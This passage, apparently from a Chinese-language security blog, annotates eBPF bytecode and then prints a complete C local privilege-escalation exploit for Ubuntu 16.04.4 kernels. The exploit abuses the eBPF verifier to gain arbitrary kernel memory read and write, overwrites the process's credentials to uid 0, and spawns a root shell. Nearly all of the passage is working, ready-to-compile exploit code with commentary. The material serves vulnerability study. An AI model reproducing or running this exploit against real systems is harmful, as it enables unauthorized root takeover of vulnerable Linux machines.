class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">35.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=2),           /* *(u32 *)(fp - 4) = 2 */</span></span><br><span class="line"><span class="number">36.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span></span><br><span class="line"><span class="number">37.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">38.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">39.</span> <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">6</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0    此时r2和r0都指向map中key=2的元素           */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), 读取BPF_REG_7地址的内容放到BPF_REG_3</span></span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),将BPF_REG_3的内容放入到BPF_REG_2</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br><span class="line"><span class="number">7.</span> <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 2),       if(op != 1 )JMP insn+2</span></span><br><span class="line"><span class="number">8.</span> <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0), when op == 1 将rbp寄存器的值即fp指针放到BPF_REG_2</span></span><br><span class="line"><span class="number">9.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), when op == 2 往BPF_REG_7的地址写入BPF_REG_8</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br></pre></td></tr></table></figure><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ubuntu 16.04.4 kernel priv esc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * all credits to @bleidl</span></span><br><span class="line"><span class="comment"> * - vnik</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line"><span class="comment">// if different kernel adjust CRED offset + check kernel stack size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x9b8 <span class="comment">// 0x5f8</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328 <span class="comment">//-32</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog = <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.prog_type = prog_type,</span><br><span class="line">.insns = (__u64)insns,</span><br><span class="line">.insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">.license = (__u64)license,</span><br><span class="line">.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">.log_size = LOG_BUF_SIZE,</span><br><span class="line">.log_level = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_type = map_type,</span><br><span class="line">.key_size = key_size,</span><br><span class="line">.value_size = value_size,</span><br><span class="line">.max_entries = max_entries&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_fd = mapfd,</span><br><span class="line">.key = (__u64)&amp;key,</span><br><span class="line">.value = (__u64)&amp;value,</span><br><span class="line">.flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_fd = mapfd,</span><br><span class="line">.key = (__u64)key,</span><br><span class="line">.value = (__u64)value,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;mapfd finished&quot;</span>);</span><br><span class="line">progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">   (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;bpf_prog_load finished&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;socketpair finished&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;setsockopt finished&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line"><span class="meta">bpf_update_elem(0, (a));   \</span></span><br><span class="line"><span class="meta">bpf_update_elem(1, (b));   \</span></span><br><span class="line"><span class="meta">bpf_update_elem(2, (c));   \</span></span><br><span class="line"><span class="meta">writemsg();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">fp = __get_fp();</span><br><span class="line"><span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">sp = get_sp(fp);</span><br><span class="line"><span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line"><span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">prep();</span><br><span class="line">pwn();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221010170323134.png"                      alt="image-20221010170323134"                